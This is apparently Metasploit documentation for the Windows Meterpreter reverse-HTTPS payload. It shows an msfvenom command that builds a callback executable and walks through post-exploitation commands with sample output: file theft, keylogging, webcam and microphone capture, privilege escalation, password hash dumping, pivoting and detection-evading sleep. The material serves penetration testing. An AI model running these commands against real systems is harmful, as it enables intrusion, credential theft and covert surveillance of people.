windows/meterpreter/reverse_https is a unique Windows payload for Metasploit Framework. It
is capable of doing things like remotely control the file system, sniff, keylog, hashdump,
pivoting, run extensions, etc. But the real strength of this is the way it talks to the
attacker.

Instead of a stream-based communication model (tied to a specific TCP session), the stager
provides a packet-based transaction system instead. You know, kind of like a botnet that we
see today. The use of HTTPS also makes the payload communication a little bit harder to detect.

## Vulnerable Application

This Meterpreter payload is suitable for the following environments:

* Windows x64
* Windows x86

## Deploying windows/meterpreter/reverse_https

windows/meterpreter/revese_https can be used in two different ways.

**As an exploit payload**

To check if windows/meterpreter/reverse_https is compatible with the exploit or not, first you can
use the ```info``` command on the exploit you want to use:

```
msf exploit(ms08_067_netapi) > info

       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
     Module: exploit/windows/smb/ms08_067_netapi
   Platform: Windows
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2008-10-28

...
```

If the platform field includes Windows, then you can use windows/meterpreter/reverse_https as the
payload.

Depending on the module, sometimes you have to select a specific target by first checking the
target list, like the following:

```
show targets
```

If there is a Windows target, use that:

```
set TARGET [index]
```

To actually set the payload:

1. In msfconsole, load the exploit.
2. Do: ```set PAYLOAD windows/meterpreter/reverse_https```
3. Set the ```LHOST``` OPTION WHICH, which [IP the same the payload connect to](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit).
4. Run th exploit

**As a standalone**

To generate windows/meterpreter/reverse_https, you can do this from msfvenom:

```
./msfvenom -p windows/meterpreter/reverse_https lhost=172.16.23.1 lport=4444 -f exe -o /tmp/https.exe
```

## Important Basic Commands

**pwd command**

The ```pwd``` command allows you to see the current directory you're in on the remote target.
Example:

```
meterpreter > pwd
C:\Users\sinn3r\Desktop
```

**cd command**

The ```cd``` command allows you to change directories. Example:

```
meterpreter > cd C:\\
```

**cat command**

The ```cat``` command allows you to see the content of a file:

```
meterpreter > cat data.txt
Hello World
```

**upload command**

The ```upload``` command allows you to upload a file to the remote target. For example:

```
meterpreter > upload /tmp/payload.exe C:\\Users\\sinn3r\\Desktop
[*] uploading  : /tmp/payload.exe -> C:\Users\sinn3r\Desktop
[*] uploaded   : /tmp/payload.exe -> C:\Users\sinn3r\Desktop\payload.exe
meterpreter > 
```

The ```-r``` option for the command also allows you to upload recursively.

**download command**

The ```download``` command allows you download a file from the remote target to your machine.
For example:

```
meterpreter > download C:\\Users\\sinn3r\\Desktop\\password.txt
[*] downloading: C:\Users\sinn3r\Desktop\password.txt -> password.txt
[*] download   : C:\Users\sinn3r\Desktop\password.txt -> password.txt
```

**search command**

The ```search``` command allows you to find files on the remote file system. For example, this
demonstrates how to find all text files in the current directory:

```
meterpreter > search -d . -f *.txt
Found 1 result...
    .\password.txt (11 bytes)
```

Note that without the ```-d``` option, the command will attempt to search in all drives.

The ```-r``` option for the commands allows you to search recursively.

**ifconfig/ipconfig command**

The ```ifconfig``` command displays the network interfaces on the remote machine:

```
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 2
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:eb:33:d9
MTU          : 1500
IPv4 Address : 172.16.23.185
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::5911:c25:bd50:5a6d
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > 
```
The command ```ipconfig``` is an alias for ```ifconfig```.

**getuid command**

The ```getuid``` command shows you the current user that the payload is running as:

```
meterpreter > getuid
Server username: WIN-6NH0Q8CJQVM\sinn3r
```

**execute command**

The ```execute``` command allows you to execute a command or file on the remote machine.

The following example will spawn a calculator:

```
meterpreter > execute -f calc.exe
Process 2020 created.
```

**ps command**

The ```ps``` command lists the running processes on the remote machine.

**shell command**

The ```shell``` command allows you to interact with the remote machine's command prompt. Example:

```
meterpreter > shell
Process 2872 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\sinn3r\Desktop>
```

**sysinfo command**

The ```sysinfo``` command shows you basic information about the remote machine. Example:

```
meterpreter > sysinfo
Computer        : WIN-6NH0Q8CJQVM
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > 
```

**keyscan command**

The ```keyscan_start``` command starts the keylogging feature on the remote machine.

**keyscan_dump command**

The ```keyscan_dump``` command is a keylogger feature. You must use the ```keyscan_start``` command
before using this. Example:

```
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
hello world!
meterpreter > 
```

**keyscan_stop command**

The ```keyscan_stop``` command stops the keylogger.

**screenshot command**

The ```screenshot``` command takes a screenshot of the target machine.

**webcan_list command**

The ```webcam_list``` commands shows you a list of webcams that you can control. You'll
probably want to use this first before using any other webcam commands.

**webcam_snap command**

The ```webcam_snap``` commands uses the selected webcam to take a picture.

**webcam_stream command**

The ```webcam_stream``` command basically uses the ```webcam_snap``` command repeatedly to create
the streaming effect. There is no sound.

**record_mic command**

The ```record_mic``` command captures audio on the remote machine.

**getsystem command**

The ```getsystem``` command attempts to elevate your privilege on the remote machine with one of
these techniques:

* Named pipe impersonation (in memory)
* Named pipe impersonation (dropper)
* Token duplication (in memory)

Example:

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

**hashdump command**

The ```hashdump``` commands allows you to dump the Windows hashes if there are the right privileges.
For sxample:

```
meterpreter > hashdump
Administrator:500:e39baff0f2c5fd4e93e28745b8bf4ba6:f4974ee4a935ee160a927eafbb3f317f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:92a84e332fa4b09e9850257ad6826566:8fb9a6e155fd6e14a16c37427b68bbb4:::
root:1003:633c097a37b26c0caad3b435b51404ee:f2477a144dff4f216ab81f2ac3e3207d:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:e09fcdea29d93203c925b205640421f2:::
```

**detach command**

The ```detach``` command allows you to temporarily disconnect the Meterpreter session without
actually losing it, as the following example demonstrates:

```
meterpreter > detach

[*] 172.16.23.185 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(handler) > run

[*] Started HTTPS reverse handler on https://172.16.23.1:4444
[*] Starting the payload handler...
[*] https://172.16.23.1:4444 handling request from 172.16.23.185; (UUID: utvmhcay) Attaching orphaned/stageless session...
"https://172.16.23.1:4444/56uhMwqiB8B0s3WyIzN-3wEo5JA4AcwGUum6UAAWxN2MEy0-Tw8f0GH7EOK-uTte7O6WXt8y9KRTiQX88Fn0CNy5yxFMndf1NPfRXelG6se/"
[*] Meterpreter session 2 opened (172.16.23.1:4444 -> 172.16.23.185:49207) at 2016-07-11 11:38:21 -0500

meterpreter >
```

By default, the Meterpreter session will continue to reach back to you for five minutes. If it
is unable to connect back after that, it will terminate. You can extend this by setting the
```SessionCommunicationTimeout``` option to your choice. Setting this option to 0 ensures that
your session will reattach whenever the target comes back online, as long as the payload handler
is running.


## Using a Post Module

One of the best things about Meterpreter is you have access to a variety of post exploitation
modules, specifically for the multi and Windows categories. Post modules provide you with more capabilities to
collect data from the remote machine automatically. For example, you can steal passwords
from popular applications and enumerate or modify system settings.

To use a post module from the Meterpreter prompt, simply use the ```run``` command:

```
meterpreter > run post/windows/gather/checkvm 

[*] Checking if WIN-6NH0Q8CJQVM is a Virtual Machine .....
[*] This is a VMware Virtual Machine
meterpreter >
```

It is also possible to run a post module via multiple Meterpreter sessions. To learn how, load
the specific post module you wish to run, and enter ```info -d``` to see the basic usage in the
documentation.

## Using the Post Exploitation API in IRB

To enter IRB, do the following at the Meterpreter prompt:

```
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>> 
```

**The client object**

The client object in Meterpreter's IRB allows you control or retrieve information about the host. For example, this demonstrates how to obtain the current privilege we're running the payload as:

```ruby
>> client.sys.config.getuid
```

To explore the client object, there are a few tricks. For example, you can use the #inspect method to inspect it:

```
>> client.inspect
```

You can use the #methods method to see what methods you can use:

```
>> client.methods
```

To find the source of the method, you can use the #source_location method. For example, say I want to find the source code for the #getuid method:

```
>> client.sys.config.method(:getuid).source_location
=> ["/Users/user/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb", 32]
```

The first element of the array is the location of the file. The second element is the line number of the method.

## Using Railgun

Railgun allows you to use the remote machine's Windows API in Ruby. For example, to create a MessageBox on the target machine, do:

```
>> client.railgun.user32.MessageBoxA(0, "hello, world", "hello", "MB_OK")
=> {"GetLastError"=>0, "ErrorMessage"=>"The operation completed successfully.", "return"=>1}
```

To learn more about using Railgun, please read this [wiki](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation).


## Routing through the portfwd command

The portfwd command allows you to talk to a remote service like it's local. For example, SMB is a
commonly targeted protocol, but by default it is blocked by a firewall. To being able to talk to
it, we can portfwd via an active session:

```
meterpreter > portfwd add -l 445 -p 445 -r 172.16.23.185
[*] Local TCP relay created: :445 <-> 172.16.23.185:445
```

And then talk to the remote SMB service like it's local:

```
msf auxiliary(smb_version) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(smb_version) > run

[*] 127.0.0.1:445         - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WIN-6NH0Q8CJQVM) (domain:WORKGROUP)
```

## Routing through msfconsole

The route command from the msf prompt can also be used to bypass firewall like portfwd, but it also
allows you to connect to hosts on a different network through the compromised machine.

To do that, first off, look at the ifconfig/ipconfig output and determine your pivot point:

```
meterpreter > ipconfig
```

Make sure you know the subnet, netmask, and the Meterpreter/session ID. Return to the msf prompt,
and establish that route:

```
msf > route add 192.168.1.0 255.255.255.0 1
```

At that point, you should have a working pivot. You can use other Metasploit modules to explore
or exploit more hosts on the network, or use auxiliary/server/socks4a and [Proxychains](http://proxychains.sourceforge.net/) to allow
other third-party tools to do the same.


## Meterpreter Stageless Mode

A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a
normal one would actually cost too much time and bandwidth in a penetration test. To learn more
about this, [click on this](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode)
to read more.

To use the stageless payload, use ```windows/meterpreter_reverse_https``` instead.

## Meterpreter Sleep Control

The sleep mode allows the payload on the target machine to be quiet for awhile, mainly in order to
avoid suspicious active communication. It also provides better efficiency.

It is very simple to use. At the Meterpreter prompt, simply do:

```
meterpreter > sleep 20
```

And that will allow Meterpreter to sleep 20 seconds, and will reconnect as long as the handler
remains active (such as running as a background job).

To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Sleep-Control).

## Meterpreter Timeout Control

The timeout control basically defines the life span of Meterpreter. To configure it, use the
```set_timeouts``` command:

```
meterpreter > set_timeouts 
Usage: set_timeouts [options]

Set the current timeout options.
Any or all of these can be set at once.

OPTIONS:

    -c <opt>  Comms timeout (seconds)
    -h        Help menu
    -t <opt>  Retry total time (seconds)
    -w <opt>  Retry wait time (seconds)
    -x <opt>  Expiration timout (seconds)
```

To see the current timeout configuration, you can use the ```get_timeouts``` command:

```
meterpreter > get_timeouts
Session Expiry  : @ 2016-03-11 21:15:58
Comm Timeout    : 300 seconds
Retry Total Time: 3600 seconds
Retry Wait Time : 10 seconds
```

To learn more about timeout control, please [go here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control).

## Meterpreter Transport Control

Transport Control allows you manage transports on the fly while the payload session is still
running. Meterpreter can automatically cycle through the transports when communication fails,
or you can do it manually.

To learn more about this, please read this [documentation](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control).

